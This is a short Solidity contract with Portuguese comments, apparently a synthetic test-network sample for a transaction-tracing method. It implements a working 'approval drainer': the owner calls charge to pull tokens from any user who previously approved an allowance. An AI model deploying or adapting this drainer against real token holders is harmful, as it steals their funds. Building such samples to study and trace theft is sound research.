// SPDX-License-Identifier: Apache-2.0
// USO EXCLUSIVO EM REDE DE TESTE (Nile), para o exemplo sintético do método de rastreio.
// Reproduz o formato público de um "drenador por autorização": quem implanta chama
// charge(usuario, valor) e o contrato executa transferFrom(usuario, dono, valor),
// valendo-se de uma autorização (approve/increaseApproval) que a vítima assinou antes.
pragma solidity 0.8.6;

interface ITRC20 {
    function transferFrom(address de, address para, uint256 valor) external returns (bool);
}

contract DrenadorTeste {
    address public immutable dono;
    ITRC20 public immutable token;

    constructor(address token_) {
        dono = msg.sender;
        token = ITRC20(token_);
    }

    function charge(address usuario, uint256 valor) external {
        require(msg.sender == dono, "so o dono");
        token.transferFrom(usuario, dono, valor);
    }
}
